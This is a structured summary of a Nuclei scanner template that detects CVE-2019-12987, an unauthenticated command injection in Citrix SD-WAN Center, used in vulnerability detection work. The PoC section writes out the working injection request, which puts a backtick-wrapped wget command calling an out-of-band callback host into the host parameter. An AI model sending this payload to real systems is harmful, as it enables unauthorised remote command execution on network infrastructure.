---
cve_id: CVE-2019-12987
template_path: nuclei-templates/http/cves/2019/CVE-2019-12987.yaml
affected_product: Citrix SD-WAN Center
severity: critical
authentication: none
external_callback: true
affected_versions: unknown
preconditions: []
poc_classification: rce
---

## Vulnerability
Citrix SD-WAN Center contains a critical remote command injection vulnerability in the `StorageMgmtController` via the `apply` action. The `callStoragePerl` function does not sufficiently validate or sanitize HTTP request parameter values (`action`, `host`, `path`, or `type`) that are used to construct a shell command. An unauthenticated attacker can trigger this by routing traffic through the Collector controller and supplying an array value with crafted parameters, enabling arbitrary command execution, sensitive information disclosure, data modification, and/or full infrastructure compromise.  
CVSS v3.0: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). CWE-78.

## PoC / Detection
Classification: rce

The template first issues a `GET /login` request and matches for `<title>Citrix SD-WAN</title>` in the response body to fingerprint the product. It then issues a crafted `GET /Collector/storagemgmt/apply?data[0][host]=`/bin/wget+http://{{interactsh-url}}`&data[0][path]=mypath&data[0][type]=mytype` request to inject a command that forces an outbound HTTP request. Success is confirmed by an `interactsh_protocol` matcher detecting the HTTP callback.

## References
- https://www.tenable.com/security/research/tra-2019-31
- https://support.citrix.com/article/CTX251987
- https://nvd.nist.gov/vuln/detail/CVE-2019-12987
